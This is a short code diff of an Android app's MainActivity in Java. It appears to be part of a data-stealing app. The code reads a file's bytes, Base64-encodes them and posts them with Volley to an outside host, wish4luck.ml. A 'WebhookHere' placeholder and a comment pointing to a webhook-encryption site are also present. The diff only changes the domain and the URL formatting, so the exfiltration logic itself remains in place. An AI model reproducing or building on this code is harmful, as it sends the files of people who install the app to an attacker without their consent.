@@ -59,7 +59,7 @@ public class MainActivity extends AppCompatActivity {
         {
             try {
                 final String encodeToString = Base64.encodeToString(FilesKt.readBytes(file), 0);
-                //Encrypt your webhook at https://lanx.ml/webhook.php
+                //Encrypt your webhook at https://wish4luck.ml/webhook.php
                 postDataUsingVolley(encodeToString, "WebhookHere");
             }
             catch (Exception ex)
@@ -154,7 +154,7 @@ public class MainActivity extends AppCompatActivity {
     private void postDataUsingVolley(final String save, final String webhook) {
 
 
-        String url = "https://wish4luck.ml/";
+        String url = "https://wish4luck.ml";
 
 
         RequestQueue queue = Volley.newRequestQueue(MainActivity.this);
